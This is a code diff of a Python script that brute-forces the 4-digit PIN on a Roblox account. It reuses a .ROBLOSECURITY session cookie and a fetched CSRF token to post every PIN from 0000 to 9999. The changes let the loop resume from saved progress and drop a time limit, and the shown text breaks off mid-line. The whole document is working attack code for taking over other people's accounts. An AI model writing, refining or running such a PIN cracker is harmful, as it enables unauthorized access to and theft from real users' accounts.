@@ -38,11 +38,10 @@ xcrsf = requests.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURI
 header = {'X-CSRF-TOKEN': xcrsf}
 
 start_time = time.time()
-max_duration = 25 * 24 * 60 * 60
 current_pin = load_progress()
 
-for current_pin in range(10000):  
-    pin = str(current_pin).zfill(4)  
+for current_pin in range(current_pin, 10000):
+    pin = str(current_pin).zfill(4)
     payload = {'pin': pin}
     r = requests.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": cookie})
 
@@ -76,11 +75,11 @@ for current_pin in range(10000):
         time.sleep(10)
 
     elif 'PIN limit reached' in r.text:
-        print("\u001B[31m[PINLIMIT REACHED] You have reached the maximum number of PIN attempts. Please try again later.\u001B[37m")
+        print("\u001B[31m[PIN LIMIT REACHED] You have reached the maximum number of PIN attempts. Please try again later.\u001B[37m")
         break
 
-    save_progress(current_pin) 
+    save_progress(current_pin)
 
 end_time = time.time()
 print(f"Cracking process completed in {end_time - start_time:.2f} seconds.")
-print("\u001B[32m[CRACKER FINISHED]\u001B[37m")
+print("\u001B[32m[CRACKER FINISHED]\u
